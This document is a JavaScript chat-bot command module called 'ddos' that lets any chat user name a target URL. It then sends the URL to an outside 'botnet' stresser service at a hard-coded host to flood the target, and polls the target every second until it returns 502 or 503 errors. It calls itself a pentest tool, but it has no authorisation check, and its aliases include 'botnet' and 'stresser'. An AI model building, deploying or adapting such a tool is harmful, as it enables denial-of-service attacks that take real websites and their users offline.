const axios = require("axios");

const apiEndpoints = [
  "http://sgp1.hmvhostings.com:25694"
];

module.exports.config = {
  name: "ddos",
  aliases: ["cosmic", "dildos", "botnet", "su", "stresser"],
  type: "pentest",
  role: 0,
  isPrefix: true,
  info: "Perform DILDOS ATTACK on a target URL for pentest or testing purposes.",
  author: "Kenneth Panio",
  cd: 10,
  guide: "ddos http://example.com | ddos stop",
  usage: "[url] or [stop]",
};

module.exports.run = async ({ args, chat, font }) => {
  const targetUrl = args[0];

  if (!targetUrl) {
    return chat.reply(font.thin("Please provide a URL to attack!"));
  }

  let attackInterval = null;
  let errorMessageSent = false;
  let isAttackInitiated = false; // Track if an attack is in progress

  const tryAttack = async (apis, index = 0) => {
    if (index >= apis.length) {
      return chat.reply(
        font.thin(
          "All BOTNETs are currently busy, try again later after all attacks are finished!"
        )
      );
    }

    // Prevent multiple initiations
    if (isAttackInitiated && !targetUrl.toLowerCase() === "stop") {
      return chat.reply(font.thin("An attack is already in progress!"));
    }

    try {
      let response;
      const isStopCommand = targetUrl.toLowerCase() === "stop";

      if (!isStopCommand) {
        const preparingMessage = await chat.reply(
          font.bold("Preparing to attack target...")
        );

        response = await axios.get(
          `${apis[index]}/stresser?url=${encodeURIComponent(targetUrl)}`,
          { timeout: 10000 }
        );

        preparingMessage.delete();
        isAttackInitiated = true; // Mark attack as initiated
      } else {
        response = await axios.get(`${apis[index]}/stop`, { timeout: 10000 });

        // Clear attack state
        isAttackInitiated = false;
        if (attackInterval) {
          clearInterval(attackInterval);
          attackInterval = null;
        }
      }

      // Display response message or default
      await chat.reply(
        font.thin(response.data?.message || (isStopCommand ? "Attack stopped!" : "Attack initiated successfully!"))
      );

      // Start monitoring if not a stop command
      if (!isStopCommand) {
        attackInterval = setInterval(async () => {
          if (errorMessageSent) {
            clearInterval(attackInterval);
            attackInterval = null;
            isAttackInitiated = false; // Reset on error
            return;
          }

          try {
            await axios.get(targetUrl.match(/^(https?:\/\/[^\/]+)/)[0], {
              timeout: 10000,
            });
          } catch (error) {
            if (errorMessageSent) {
              clearInterval(attackInterval);
              attackInterval = null;
              isAttackInitiated = false; // Reset on error
              return;
            }

            errorMessageSent = true;
            clearInterval(attackInterval);
            attackInterval = null;
            isAttackInitiated = false; // Reset on error

            if (error.response) {
              if (error.response.status === 503) {
                await chat.reply(font.thin("Service Unavailable (503)."));
              } else if (error.response.status === 502) {
                await chat.reply(font.thin("Bad Gateway (502)."));
              }
            }
          }
        }, 1000);
      }
    } catch (error) {
      if (error.code === "ENOTFOUND" || error.code === "ECONNABORTED") {
        // Retry with next API only if attack not initiated
        if (!isAttackInitiated) {
          return tryAttack(apis, index + 1);
        }
      } else {
        // Report error and reset state
        isAttackInitiated = false;
        await chat.reply(font.thin(`Failed to initiate attack: ${error.message}`));
      }
    }
  };

  await tryAttack(apiEndpoints);
};